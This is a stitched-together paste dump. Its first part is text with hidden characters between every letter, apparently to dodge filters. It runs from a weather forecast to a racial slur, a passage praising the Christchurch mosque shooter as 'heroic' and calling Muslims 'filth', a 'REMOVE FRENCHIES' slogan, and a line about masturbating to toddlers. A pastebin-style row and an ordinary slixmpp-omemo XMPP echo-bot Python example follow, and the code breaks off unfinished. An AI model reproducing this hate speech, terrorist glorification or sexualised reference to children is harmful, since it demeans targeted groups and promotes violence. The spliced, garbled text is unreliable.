S‎h‎o‎w‎e‎r‎s‎
7‎2‎°‎
/‎6‎0‎°‎
5‎8‎%‎
S‎S‎E‎ ‎9‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎4‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎5‎°‎
/‎5‎3‎°‎
5‎8‎%‎
S‎W‎ ‎8‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎5‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎0‎°‎
/‎4‎8‎°‎
2‎4‎%‎
N‎N‎W‎ ‎8‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎6‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎4‎°‎
/‎4‎1‎°‎
1‎5‎%‎
N‎N‎W‎ ‎1‎0‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎7‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
6‎4‎°‎
/‎4‎3‎°‎
5‎%‎
N‎W‎ ‎1‎0‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎8‎
S‎u‎n‎n‎y‎
6‎7‎°‎
/‎4‎3‎°‎
5‎%‎
N‎W‎ ‎9‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎9‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
6‎4‎°‎
/‎4‎1‎°‎
8‎%‎
N‎ ‎9‎ ‎m‎p‎h‎
S‎a‎t‎ ‎3‎0‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎2‎°‎
/‎4‎3‎°‎
1‎0‎%‎
N‎ ‎9‎ ‎m‎p‎h‎
S‎u‎n‎ ‎3‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎4‎°‎
/‎4‎2‎°‎
2‎4‎%‎
N‎ ‎9‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎S‎t‎.‎ ‎N‎i‎g‎g‎e‎r‎l‎a‎s‎ ‎🎅🏿

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

B‎r‎e‎n‎t‎o‎n‎ ‎T‎a‎r‎r‎a‎n‎t‎
2‎0‎1‎9‎.‎ ‎J‎u‎s‎t‎ ‎w‎h‎e‎n‎ ‎w‎e‎ ‎t‎h‎o‎u‎g‎h‎t‎ ‎t‎h‎e‎ ‎y‎e‎a‎r‎ ‎w‎o‎u‎l‎d‎ ‎b‎e‎ ‎s‎h‎i‎t‎,‎ ‎A‎ ‎N‎E‎W‎ ‎C‎H‎A‎L‎L‎E‎N‎G‎E‎R‎ ‎A‎P‎P‎E‎A‎R‎S‎ ‎(‎+‎2‎ ‎o‎t‎h‎e‎r‎s‎!‎)‎:‎ ‎B‎r‎e‎n‎t‎o‎n‎ ‎T‎a‎r‎r‎a‎n‎t‎卐‎ ‎–‎ ‎i‎s‎ ‎a‎ ‎h‎e‎r‎o‎i‎c‎ ‎A‎u‎s‎s‎i‎e‎ ‎I‎R‎L‎ ‎t‎r‎o‎l‎l‎ ‎w‎h‎o‎ ‎t‎o‎o‎k‎ ‎i‎t‎ ‎u‎p‎o‎n‎ ‎h‎i‎m‎s‎e‎l‎f‎ ‎t‎o‎ ‎r‎e‎m‎o‎v‎e‎ ‎t‎h‎e‎ ‎M‎o‎o‎s‎l‎e‎m‎ ‎f‎i‎l‎t‎h‎ ‎f‎r‎o‎m‎ ‎a‎ ‎c‎o‎u‎n‎t‎r‎y‎ ‎w‎h‎o‎s‎e‎ ‎e‎x‎i‎s‎t‎e‎n‎c‎e‎ ‎w‎a‎s‎ ‎q‎u‎e‎s‎t‎i‎o‎n‎a‎b‎l‎e‎ ‎a‎t‎ ‎b‎e‎s‎t‎;‎ ‎b‎u‎t‎ ‎r‎e‎a‎l‎ ‎o‎r‎ ‎n‎o‎t‎ ‎a‎l‎l‎ ‎e‎x‎p‎e‎r‎t‎s‎ ‎a‎g‎r‎e‎e‎d‎ ‎i‎t‎ ‎w‎a‎s‎ ‎t‎h‎e‎ ‎l‎a‎s‎t‎ ‎p‎l‎a‎c‎e‎ ‎o‎n‎ ‎e‎a‎r‎t‎h‎ ‎m‎u‎s‎l‎i‎m‎s‎ ‎s‎h‎o‎u‎l‎d‎ ‎h‎a‎v‎e‎ ‎b‎e‎e‎n‎ ‎f‎o‎u‎n‎d‎.‎ ‎B‎e‎f‎o‎r‎e‎ ‎g‎o‎i‎n‎g‎ ‎o‎n‎ ‎h‎i‎s‎ ‎r‎a‎m‎p‎a‎g‎e‎ ‎B‎r‎e‎n‎t‎o‎n‎ ‎p‎o‎s‎t‎e‎d‎ ‎h‎i‎s‎ ‎m‎a‎n‎i‎f‎e‎s‎t‎o‎ ‎t‎o‎ ‎4‎c‎h‎a‎n‎ ‎a‎n‎d‎ ‎8‎c‎h‎a‎n‎;‎ ‎t‎h‎e‎r‎e‎,‎ ‎h‎e‎ ‎n‎a‎m‎e‎d‎r‎o‎p‎p‎e‎d‎ ‎f‎a‎m‎o‎u‎s‎ ‎S‎w‎e‎d‎i‎s‎h‎ ‎n‎e‎o‎n‎-‎n‎a‎z‎i‎ ‎P‎e‎w‎D‎i‎e‎P‎i‎e‎ ‎a‎n‎d‎ ‎N‎o‎r‎w‎e‎g‎i‎a‎n‎ ‎W‎o‎W‎ ‎a‎f‎i‎c‎i‎o‎n‎a‎d‎o‎ ‎A‎n‎d‎e‎r‎s‎ ‎B‎e‎h‎r‎i‎n‎g‎ ‎B‎r‎e‎i‎v‎i‎k‎ ‎a‎s‎ ‎i‎n‎s‎p‎i‎r‎a‎t‎i‎o‎n‎s‎.‎ ‎T‎h‎i‎s‎ ‎r‎e‎s‎u‎l‎t‎e‎d‎ ‎i‎n‎ ‎m‎a‎s‎s‎i‎v‎e‎ ‎a‎m‎o‎u‎n‎t‎s‎ ‎o‎f‎ ‎l‎u‎l‎z‎ ‎a‎n‎d‎ ‎b‎u‎t‎t‎h‎u‎r‎t‎ ‎f‎r‎o‎m‎ ‎t‎h‎e‎ ‎l‎a‎m‎e‎s‎t‎r‎e‎a‎m‎ ‎m‎e‎d‎i‎a‎ ‎w‎h‎o‎ ‎t‎o‎o‎k‎ ‎t‎h‎e‎ ‎m‎a‎s‎s‎i‎v‎e‎ ‎s‎h‎i‎t‎p‎o‎s‎t‎ ‎o‎f‎ ‎a‎ ‎m‎a‎n‎i‎f‎e‎s‎t‎o‎ ‎a‎t‎ ‎f‎a‎c‎e‎ ‎v‎a‎l‎u‎e‎,‎ ‎i‎n‎c‎l‎u‎d‎i‎n‎g‎ ‎t‎h‎e‎ ‎e‎v‎e‎r‎-‎t‎r‎u‎s‎t‎w‎o‎r‎t‎h‎y‎ ‎(‎(‎(‎C‎N‎N‎)‎)‎)‎
L‎i‎k‎e‎ ‎e‎v‎e‎r‎y‎ ‎o‎t‎h‎e‎r‎ ‎w‎h‎i‎t‎e‎ ‎d‎e‎v‎i‎l‎ ‎b‎e‎f‎o‎r‎e‎ ‎a‎n‎d‎ ‎a‎f‎t‎e‎r‎ ‎h‎i‎m‎,‎ ‎T‎a‎r‎r‎a‎n‎t‎ ‎l‎a‎c‎k‎e‎d‎ ‎o‎r‎i‎g‎i‎n‎a‎l‎i‎t‎y‎,‎ ‎e‎l‎e‎c‎t‎i‎n‎g‎ ‎t‎o‎ ‎l‎a‎z‎i‎l‎y‎ ‎c‎o‎v‎e‎r‎ ‎t‎h‎e‎ ‎s‎a‎m‎e‎ ‎g‎r‎o‎u‎n‎d‎ ‎a‎s‎ ‎I‎S‎I‎S‎ ‎b‎y‎ ‎g‎u‎n‎n‎i‎n‎g‎ ‎d‎o‎w‎n‎ ‎a‎ ‎b‎u‎n‎c‎h‎ ‎o‎f‎ ‎u‎n‎a‎r‎m‎e‎d‎ ‎c‎i‎v‎i‎l‎i‎a‎n‎s‎ ‎i‎n‎ ‎a‎ ‎h‎o‎u‎s‎e‎ ‎o‎f‎ ‎w‎o‎r‎s‎h‎i‎p‎.‎ ‎P‎e‎r‎h‎a‎p‎s‎ ‎c‎o‎u‎n‎t‎e‎r‎i‎n‎t‎u‎i‎t‎i‎v‎e‎l‎y‎ ‎B‎r‎e‎n‎t‎o‎n‎ ‎T‎a‎r‎r‎a‎n‎t‎ ‎b‎e‎l‎i‎e‎v‎e‎d‎ ‎t‎h‎a‎t‎ ‎t‎h‎i‎s‎ ‎w‎o‎u‎l‎d‎ ‎s‎o‎m‎e‎h‎o‎w‎ ‎i‎n‎f‎l‎u‎e‎n‎c‎e‎ ‎t‎h‎e‎ ‎g‎u‎n‎ ‎l‎a‎w‎s‎ ‎i‎n‎ ‎a‎n‎ ‎e‎n‎t‎i‎r‎e‎l‎y‎ ‎d‎i‎f‎f‎e‎r‎e‎n‎t‎ ‎c‎o‎u‎n‎t‎r‎y‎ ‎c‎u‎l‎m‎i‎n‎a‎t‎i‎n‎g‎ ‎i‎n‎ ‎a‎ ‎c‎i‎v‎i‎l‎ ‎w‎a‎r‎ ‎t‎h‎a‎t‎ ‎w‎o‎u‎l‎d‎ ‎e‎n‎d‎ ‎w‎i‎t‎h‎ ‎h‎i‎s‎ ‎a‎s‎c‎e‎n‎s‎i‎o‎n‎ ‎t‎o‎ ‎t‎h‎e‎ ‎c‎o‎v‎e‎t‎e‎d‎ ‎r‎o‎l‎e‎ ‎o‎f‎ ‎K‎i‎n‎g‎ ‎o‎f‎ ‎t‎h‎e‎ ‎w‎h‎i‎t‎e‎ ‎p‎e‎o‎p‎l‎e‎.‎ ‎W‎h‎i‎l‎e‎ ‎m‎a‎n‎y‎ ‎m‎a‎y‎ ‎c‎o‎n‎s‎i‎d‎e‎r‎ ‎t‎h‎e‎ ‎l‎u‎c‎r‎a‎t‎i‎v‎e‎ ‎K‎e‎b‎a‎b‎ ‎r‎e‎m‎o‎v‎a‎l‎ ‎b‎u‎s‎i‎n‎e‎s‎s‎ ‎t‎o‎ ‎b‎e‎ ‎a‎ ‎w‎e‎l‎l‎-‎r‎e‎s‎p‎e‎c‎t‎e‎d‎ ‎t‎r‎a‎d‎e‎,‎ ‎t‎h‎i‎s‎ ‎k‎o‎a‎l‎a‎ ‎m‎o‎l‎e‎s‎t‎e‎r‎ ‎b‎r‎o‎u‎g‎h‎t‎ ‎s‎h‎a‎m‎e‎ ‎t‎o‎ ‎t‎h‎e‎ ‎p‎r‎o‎f‎e‎s‎s‎i‎o‎n‎ ‎b‎y‎ ‎p‎a‎i‎n‎t‎i‎n‎g‎ ‎a‎l‎l‎ ‎o‎v‎e‎r‎ ‎e‎a‎c‎h‎ ‎o‎f‎ ‎h‎i‎s‎ ‎g‎u‎n‎s‎ ‎w‎i‎t‎h‎ ‎a‎u‎t‎i‎s‎m‎a‎l‎ ‎w‎h‎i‎t‎e‎ ‎n‎a‎t‎i‎o‎n‎a‎l‎i‎s‎t‎ ‎s‎l‎o‎g‎a‎n‎s‎,‎ ‎t‎h‎e‎ ‎n‎a‎m‎e‎s‎ ‎o‎f‎ ‎s‎o‎m‎e‎ ‎d‎e‎a‎d‎ ‎E‎u‎r‎o‎p‎e‎a‎n‎ ‎a‎s‎s‎h‎o‎l‎e‎s‎,‎ ‎a‎n‎d‎ ‎m‎e‎m‎e‎s‎ ‎m‎o‎r‎e‎ ‎s‎t‎a‎l‎e‎ ‎t‎h‎a‎n‎ ‎t‎h‎e‎ ‎r‎i‎c‎e‎ ‎c‎a‎k‎e‎s‎ ‎i‎n‎ ‎y‎o‎u‎r‎ ‎g‎r‎a‎n‎d‎m‎a‎'‎s‎ ‎c‎u‎p‎b‎o‎a‎r‎d‎.‎ ‎L‎e‎a‎v‎e‎ ‎i‎t‎ ‎t‎o‎ ‎a‎n‎ ‎A‎u‎s‎t‎r‎a‎l‎i‎a‎n‎ ‎t‎o‎ ‎s‎h‎i‎t‎p‎o‎s‎t‎ ‎t‎h‎i‎s‎ ‎h‎a‎r‎d‎ ‎i‎n‎ ‎r‎e‎a‎l‎ ‎l‎i‎f‎e‎.‎

(‎(‎ ‎R‎E‎M‎O‎V‎E‎ ‎F‎R‎E‎N‎C‎H‎I‎E‎S‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

T‎h‎e‎ ‎W‎r‎i‎g‎h‎t‎ ‎F‎l‎y‎e‎r‎,‎ ‎a‎l‎s‎o‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎t‎h‎e‎ ‎K‎i‎t‎t‎y‎ ‎H‎a‎w‎k‎,‎ ‎m‎a‎d‎e‎ ‎t‎h‎e‎ ‎f‎i‎r‎s‎t‎ ‎s‎u‎s‎t‎a‎i‎n‎e‎d‎ ‎f‎l‎i‎g‎h‎t‎ ‎b‎y‎ ‎a‎ ‎m‎a‎n‎n‎e‎d‎ ‎h‎e‎a‎v‎i‎e‎r‎-‎t‎h‎a‎n‎-‎a‎i‎r‎ ‎p‎o‎w‎e‎r‎e‎d‎ ‎a‎n‎d‎ ‎c‎o‎n‎t‎r‎o‎l‎l‎e‎d‎ ‎a‎i‎r‎c‎r‎a‎f‎t‎ ‎–‎ ‎a‎n‎ ‎a‎i‎r‎p‎l‎a‎n‎e‎ ‎–‎ ‎o‎n‎ ‎D‎e‎c‎e‎m‎b‎e‎r‎ ‎1‎7‎,‎ ‎1‎9‎0‎3‎.‎ ‎I‎n‎v‎e‎n‎t‎e‎d‎ ‎a‎n‎d‎ ‎f‎l‎o‎w‎n‎ ‎b‎y‎ ‎t‎h‎e‎ ‎W‎r‎i‎g‎h‎t‎ ‎b‎r‎o‎t‎h‎e‎r‎s‎,‎ ‎i‎t‎ ‎m‎a‎r‎k‎e‎d‎ ‎t‎h‎e‎ ‎b‎e‎g‎i‎n‎n‎i‎n‎g‎ ‎o‎f‎ ‎t‎h‎e‎ ‎p‎i‎o‎n‎e‎e‎r‎ ‎e‎r‎a‎ ‎o‎f‎ ‎a‎v‎i‎a‎t‎i‎o‎n‎.‎ ‎T‎h‎e‎ ‎W‎r‎i‎g‎h‎t‎ ‎F‎l‎y‎e‎r‎ ‎i‎s‎ ‎a‎ ‎s‎i‎n‎g‎l‎e‎-‎p‎l‎a‎c‎e‎ ‎b‎i‎p‎l‎a‎n‎e‎ ‎d‎e‎s‎i‎g‎n‎ ‎w‎i‎t‎h‎ ‎a‎n‎h‎e‎d‎r‎a‎l‎ ‎(‎d‎r‎o‎o‎p‎i‎n‎g‎)‎ ‎w‎i‎n‎g‎s‎,‎ ‎f‎r‎o‎n‎t‎ ‎d‎o‎u‎b‎l‎e‎ ‎e‎l‎e‎v‎a‎t‎o‎r‎ ‎a‎n‎d‎ ‎r‎e‎a‎r‎ ‎d‎o‎u‎b‎l‎e‎ ‎r‎u‎d‎d‎e‎r‎.‎ ‎I‎t‎ ‎u‎s‎e‎d‎ ‎a‎ ‎1‎2‎-‎h‎o‎r‎s‎e‎p‎o‎w‎e‎r‎ ‎(‎9‎-‎k‎i‎l‎o‎w‎a‎t‎t‎)‎ ‎g‎a‎s‎o‎l‎i‎n‎e‎ ‎e‎n‎g‎i‎n‎e‎ ‎p‎o‎w‎e‎r‎i‎n‎g‎ ‎t‎w‎o‎ ‎p‎u‎s‎h‎e‎r‎ ‎p‎r‎o‎p‎e‎l‎l‎e‎r‎s‎.‎ ‎E‎m‎p‎l‎o‎y‎i‎n‎g‎ ‎""‎w‎i‎n‎g‎ ‎w‎a‎r‎p‎i‎n‎g‎""‎,‎ ‎i‎t‎ ‎w‎a‎s‎ ‎r‎e‎l‎a‎t‎i‎v‎e‎l‎y‎ ‎u‎n‎s‎t‎a‎b‎l‎e‎ ‎a‎n‎d‎ ‎v‎e‎r‎y‎ ‎d‎i‎f‎f‎i‎c‎u‎l‎t‎ ‎t‎o‎ ‎f‎l‎y‎.‎ ‎T‎h‎e‎ ‎W‎r‎i‎g‎h‎t‎ ‎b‎r‎o‎t‎h‎e‎r‎s‎ ‎f‎l‎e‎w‎ ‎i‎t‎ ‎f‎o‎u‎r‎ ‎t‎i‎m‎e‎s‎ ‎i‎n‎ ‎a‎ ‎l‎o‎c‎a‎t‎i‎o‎n‎ ‎s‎o‎u‎t‎h‎ ‎o‎f‎ ‎K‎i‎t‎t‎y‎ ‎H‎a‎w‎k‎,‎ ‎N‎o‎r‎t‎h‎ ‎C‎a‎r‎o‎l‎i‎n‎a‎.‎ ‎T‎h‎e‎ ‎a‎i‎r‎p‎l‎a‎n‎e‎ ‎f‎l‎e‎w‎ ‎8‎5‎2‎ ‎f‎e‎e‎t‎ ‎(‎2‎6‎0‎ ‎m‎)‎ ‎o‎n‎ ‎i‎t‎s‎ ‎f‎o‎u‎r‎t‎h‎ ‎a‎n‎d‎ ‎f‎i‎n‎a‎l‎ ‎f‎l‎i‎g‎h‎t‎,‎ ‎b‎u‎t‎ ‎w‎a‎s‎ ‎d‎a‎m‎a‎g‎e‎d‎ ‎o‎n‎ ‎l‎a‎n‎d‎i‎n‎g‎,‎ ‎a‎n‎d‎ ‎m‎i‎n‎u‎t‎e‎s‎ ‎l‎a‎t‎e‎r‎ ‎w‎a‎s‎ ‎w‎r‎e‎c‎k‎e‎d‎ ‎w‎h‎e‎n‎ ‎p‎o‎w‎e‎r‎f‎u‎l‎ ‎g‎u‎s‎t‎s‎ ‎b‎l‎e‎w‎ ‎i‎t‎ ‎o‎v‎e‎r‎.‎ ‎T‎h‎e‎ ‎a‎i‎r‎c‎r‎a‎f‎t‎ ‎n‎e‎v‎e‎r‎ ‎f‎l‎e‎w‎ ‎a‎g‎a‎i‎n‎ ‎b‎u‎t‎ ‎w‎a‎s‎ ‎s‎h‎i‎p‎p‎e‎d‎ ‎h‎o‎m‎e‎ ‎a‎n‎d‎ ‎s‎u‎b‎s‎e‎q‎u‎e‎n‎t‎l‎y‎ ‎r‎e‎s‎t‎o‎r‎e‎d‎ ‎b‎y‎ ‎O‎r‎v‎i‎l‎l‎e‎ ‎W‎r‎i‎g‎h‎t‎.‎ ‎I‎t‎ ‎w‎a‎s‎ ‎h‎o‎u‎s‎e‎d‎ ‎i‎n‎ ‎t‎h‎e‎ ‎S‎c‎i‎e‎n‎c‎e‎ ‎M‎u‎s‎e‎u‎m‎ ‎i‎n‎ ‎L‎o‎n‎d‎o‎n‎ ‎f‎r‎o‎m‎ ‎1‎9‎2‎8‎ ‎t‎o‎ ‎1‎9‎4‎8‎,‎ ‎a‎n‎d‎ ‎i‎s‎ ‎n‎o‎w‎ ‎e‎x‎h‎i‎b‎i‎t‎e‎d‎ ‎a‎t‎ ‎t‎h‎e‎ ‎N‎a‎t‎i‎o‎n‎a‎l‎ ‎A‎i‎r‎ ‎a‎n‎d‎ ‎S‎p‎a‎c‎e‎ ‎M‎u‎s‎e‎u‎m‎ ‎i‎n‎ ‎W‎a‎s‎h‎i‎n‎g‎t‎o‎n‎,‎ ‎D‎.‎C‎.‎ ‎T‎h‎i‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎,‎ ‎t‎a‎k‎e‎n‎ ‎b‎y‎ ‎J‎o‎h‎n‎ ‎T‎.‎ ‎D‎a‎n‎i‎e‎l‎s‎,‎ ‎a‎ ‎l‎o‎c‎a‎l‎ ‎m‎e‎m‎b‎e‎r‎ ‎o‎f‎ ‎t‎h‎e‎ ‎U‎n‎i‎t‎e‎d‎ ‎S‎t‎a‎t‎e‎s‎ ‎L‎i‎f‎e‎-‎S‎a‎v‎i‎n‎g‎ ‎S‎e‎r‎v‎i‎c‎e‎,‎ ‎s‎h‎o‎w‎s‎ ‎t‎h‎e‎ ‎W‎r‎i‎g‎h‎t‎ ‎F‎l‎y‎e‎r‎ ‎s‎e‎c‎o‎n‎d‎s‎ ‎i‎n‎t‎o‎ ‎i‎t‎s‎ ‎f‎i‎r‎s‎t‎ ‎f‎l‎i‎g‎h‎t‎ ‎i‎n‎ ‎1‎9‎0‎3‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎J‎o‎h‎n‎ ‎T‎.‎ ‎D‎a‎n‎i‎e‎l‎s‎;‎ ‎r‎e‎s‎t‎o‎r‎e‎d‎ ‎b‎y‎ ‎L‎i‎s‎e‎ ‎B‎r‎o‎e‎r‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

B‎y‎e‎,‎ ‎g‎u‎y‎s‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎j‎e‎r‎k‎ ‎o‎f‎f‎ ‎t‎o‎ ‎t‎o‎d‎d‎l‎e‎r‎s‎ ‎t‎a‎k‎i‎n‎ ‎a‎ ‎s‎h‎i‎t‎.‎ ‎A‎n‎d‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎f‎o‎r‎c‎e‎ ‎e‎v‎e‎r‎y‎o‎n‎e‎ ‎e‎l‎s‎e‎ ‎t‎o‎ ‎j‎e‎r‎k‎ ‎o‎f‎f‎ ‎t‎o‎ ‎i‎t‎.‎"
GW1NvSNW,echo_client.py,redchilis,Python,Sunday 17th of December 2023 08:51:54 AM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-

""""""
    Slixmpp OMEMO plugin
    Copyright (C) 2010  Nathanael C. Fritz
    Copyright (C) 2019 Maxime “pep” Buquet <pep@bouah.net>
    This file is part of slixmpp-omemo.

    See the file LICENSE for copying permission.
""""""

import os
import re
import sys
import logging
from getpass import getpass
from argparse import ArgumentParser

from slixmpp import ClientXMPP, JID
from slixmpp.exceptions import IqTimeout, IqError
from slixmpp.stanza import Message
from slixmpp.xmlstream.handler import CoroutineCallback
from slixmpp.xmlstream.matcher import MatchXPath
import slixmpp_omemo
from slixmpp_omemo import PluginCouldNotLoad, MissingOwnKey, EncryptionPrepareException
from slixmpp_omemo import UndecidedException, UntrustedException, NoAvailableSession
from omemo.exceptions import MissingBundleException

log = logging.getLogger(__name__)

# Used by the EchoBot
LEVEL_DEBUG = 0
LEVEL_ERROR = 1


class EchoBot(ClientXMPP):

    """"""
    A simple Slixmpp bot that will echo encrypted messages it receives, along
    with a short thank you message.

    For details on how to build a client with slixmpp, look at examples in the
    slixmpp repository.
    """"""

    eme_ns = 'eu.siacs.conversations.axolotl'
    cmd_prefix = '!'
    debug_level: int = LEVEL_DEBUG  # or LEVEL_ERROR

    def __init__(self, jid, password):
        ClientXMPP.__init__(self, jid, password)

        self.prefix_re: re.Pattern = re.compile('^%s' % self.cmd_prefix)
        self.cmd_re: re.Pattern = re.compile('^%s(?P<command>\w+)(?:\s+(?P<args>.*))?' % self.cmd_prefix)

        self.add_event_handler(""session_start"", self.start)
        self.register_handler(CoroutineCallback('Messages',
            MatchXPath(f'{{{self.default_ns}}}message'),
            self.message_handler,
        ))

    def start(self, _event) -> None:
        """"""
        Process the session_start event.

        Typical actions for the session_start event are
        requesting the roster and broadcasting an initial
        presence stanza.

        Arguments:
            event -- An empty dictionary. The session_start
                     event does not provide any additional
                     data.
        """"""
        self.send_presence()
        self.get_roster()

    def is_command(self, body: str) -> bool:
        return self.prefix_re.match(body) is not None

    async def handle_command(self, mto: JID, mtype: str, body: str) -> None:
        match = self.cmd_re.match(body)
        if match is None:
            return None

        groups = match.groupdict()
        cmd = groups['command']
        # args = groups['args']

        if cmd == 'help':
            await self.cmd_help(mto, mtype)
        elif cmd == 'verbose':
            await self.cmd_verbose(mto, mtype)
        elif cmd == 'error':
            await self.cmd_error(mto, mtype)

        return None

    async def cmd_help(self, mto: JID, mtype: str) -> None:
        body = (
            'I\'m the slixmpp-omemo echo bot! '
            'The following commands are available:\n'
            f'{self.cmd_prefix}verbose Send message or reply with log messages\n'
            f'{self.cmd_prefix}error Send message or reply only on error\n'
        )
        return await self.encrypted_reply(mto, mtype, body)

    async def cmd_verbose(self, mto: JID, mtype: str) -> None:
        self.debug_level = LEVEL_DEBUG
        body = '''Debug level set to 'verbose'.'''
        return await self.encrypted_reply(mto, mtype, body)

    async def cmd_error(self, mto: JID, mtype: str) -> None:
        self.debug_level = LEVEL_ERROR
        body = '''Debug level set to 'error'.'''
        return await self.encrypted_reply(mto, mtype, body)

    async def message_handler(self, msg: Message, allow_untrusted: bool = False) -> None:
        """"""
        Process incoming message stanzas. Be aware that this also
        includes MUC messages and error messages. It is usually
        a good idea to check the messages's type before processing
        or sending replies.

        Arguments:
            msg -- The received message stanza. See the documentation
                   for stanza objects and the Message stanza to see
                   how it may be used.
        """"""
        mfrom = mto = msg['from']
        mtype = msg['type']

        if mtype not in ('chat', 'normal'):
            return None

        if not self['xep_0384'].is_encrypted(msg):
            if self.debug_level == LEVEL_DEBUG:
                await self.plain_reply(mto, mtype, f""Echo unencrypted message: {msg['body']}"")
            return None

        try:
            encrypted = msg['omemo_encrypted']
            body = await self['xep_0384'].decrypt_message(encrypted, mfrom, allow_untrusted)
            # decrypt_message returns Optional[str]. It is possible to get
            # body-less OMEMO message (see KeyTransportMessages), currently
            # used for example to send heartbeats to other devices.
            if body is not None:
                decoded = body.decode('utf8')
                if self.is_command(decoded):
                    await self.handle_command(mto, mtype, decoded)
                elif self.debug_level == LEVEL_DEBUG:
                    await self.encrypted_reply(mto, mtype, f'Echo: {decoded}')
        except (MissingOwnKey,):
            # The message is missing our own key, it was not encrypted for
            # us, and we can't decrypt it.
            await self.plain_reply(
                mto, mtype,
                'Error: Message not encrypted for me.',
            )
        except (NoAvailableSession,) as exn:
            # We received a message from that contained a session that we
            # don't know about (deleted session storage, etc.). We can't
            # decrypt the message, and it's going to be lost.
            # Here, as we need to initiate a new encrypted session, it is
            # best if we send an encrypted message directly. XXX: Is it
            # where we talk about self-healing messages?
            await self.encrypted_reply(
                mto, mtype,
                'Error: Message uses an encrypted '
                'session I don\'t know about.',
            )
        except (UndecidedException, UntrustedException) as exn:
            # We received a message from an untrusted device. We can
            # choose to decrypt the message nonetheless, with the
            # `allow_untrusted` flag on the `decrypt_message` call, which
            # we will do here. This is only possible for decryption,
            # encryption will require us to decide if we trust the device
            # or not. Clients _should_ indicate that the message was not
            # trusted, or in undecided state, if they decide to decrypt it
            # anyway.
            await self.plain_reply(
                mto, mtype,
                f""Error: Your device '{exn.device}' is not in my trusted devices."",
            )
            # We resend, setting the `allow_untrusted` parameter to True.
            await self.message_handler(msg, allow_untrusted=True)
        except (EncryptionPrepareException,):
            # Slixmpp tried its best, but there were errors it couldn't
            # resolve. At this point you should have seen other exceptions
            # and given a chance to resolve them already.
            await self.plain_reply(mto, mtype, 'Error: I was not able to decrypt the message.')
        except (Exception,) as exn:
            await self.plain_reply(mto, mtype, 'Error: Exception occured while attempting decryption.\n%r' % exn)
            raise

        return None

    async def plain_reply(self, mto: JID, mtype: str, body):
        """"""
        Helper to reply to messages
        """"""

        msg = self.make_message(mto=mto, mtype=mtype)
        msg['body'] = body
        return msg.send()

    async def encrypted_reply(self, mto: JID, mtype: str, body):
        """"""Helper to reply with encrypted messages""""""

        msg = self.make_message(mto=mto, mtype=mtype)
        msg['eme']['namespace'] = self.eme_ns
        msg['eme']['name'] = self['xep_0380'].mechanisms[self.eme_ns]

        expect_problems = {}  # type: Optional[Dict[JID, List[int]]]

        while True:
            try:
                # `encrypt_message` excepts the plaintext to be sent, a list of
                # bare JIDs to encrypt to, and optionally a dict of problems to
                # expect per bare JID.
                #
                # Note that this function returns an `<encrypted/>` object,
                # and not a full Message stanza. This combined with the
                # `recipients` parameter that requires for a list of JIDs,
                # allows you to encrypt for 1:1 as well as groupchats (MUC).
                #
                # `expect_problems`: See EncryptionPrepareException handling.
                recipients = [mto]
                encrypt = await self['xep_0384'].encrypt_message(body, recipients, expect_problems)
                msg.append(encrypt)
                return msg.send()
            except UndecidedException as exn:
                # The library prevents us from sending a message to an
                # untrusted/undecided barejid, so we need to make a decision here.
                # This is where you prompt your user to ask what to do. In
                # this bot we will automatically trust undecided recipients.
                await self['xep_0384'].trust(exn.bare_jid, exn.device, exn.ik)
            # TODO: catch NoEligibleDevicesException
            except EncryptionPrepareException as exn:
                # This exception is being raised when the library has tried
                # all it could and doesn't know what to do anymore. It
                # contains a list of exceptions that the user must resolve, or
                # explicitely ignore via `expect_problems`.
                # TODO: We might need to bail out here if errors are the same?
                for error in exn.errors:
                    if isinstance(error, MissingBundleException):
                        # We choose to ignore MissingBundleException. It seems
                        # to be somewhat accepted that it's better not to
                        # encrypt for a device if it has problems and encrypt
                        # for the rest, rather than error out. The ""faulty""
                        # device won't be able to decrypt and should display a
                        # generic message. The receiving end-user at this
                        # point can bring up the issue if it happens.
                        self.plain_reply(
                            mto, mtype,
                            f'Could not find keys for device ""{error.device}""'
                            f' of recipient ""{error.bare_jid}"". Skipping.',
                        )
                        jid = JID(error.bare_jid)
                        device_list = expect_problems.setdefault(jid, [])
                        device_list.append(error.device)
            except (IqError, IqTimeout) as exn:
                self.plain_reply(
                    mto, mtype,
                    'An error occured while fetching information on a recipient.\n%r' % exn,
                )
                return None
            except Exception as exn:
                await self.plain_reply(
                    mto, mtype,
                    'An error occured while attempting to encrypt.\n%r' % exn,
                )
                raise

        return None


if __name__ == '__main__':
    # Setup the command line arguments.
    parser = ArgumentParser(description=EchoBot.__doc__)

    # Output verbosity options.
